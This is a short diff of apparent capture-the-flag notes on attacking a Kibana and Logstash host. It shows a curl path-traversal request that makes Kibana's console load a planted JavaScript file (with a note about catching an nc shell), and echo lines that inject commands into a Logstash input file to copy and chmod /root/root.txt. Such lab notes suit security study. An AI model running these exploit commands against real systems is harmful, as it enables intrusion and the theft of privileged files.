@@ -74,7 +74,6 @@ filter {
 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
 
 #notes:
-
 # curl to get remote and listen on nc port
 curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'
 
@@ -88,3 +87,4 @@ logs      : /var/log/logstash
 cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf; rm /etc/logstash/conf.d/a.conf; cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf
 echo "Ejecutar comando : cp /root/root.txt /tmp/.test.txt" >> /opt/kibana/logstash_0
 echo "Ejecutar comando : chmod 777 /tmp/.test.txt" >> /opt/kibana/logstash_0
+echo "Ejecutar comando : rm /tmp/.test.txt" >> /opt/kibana/logstash_0
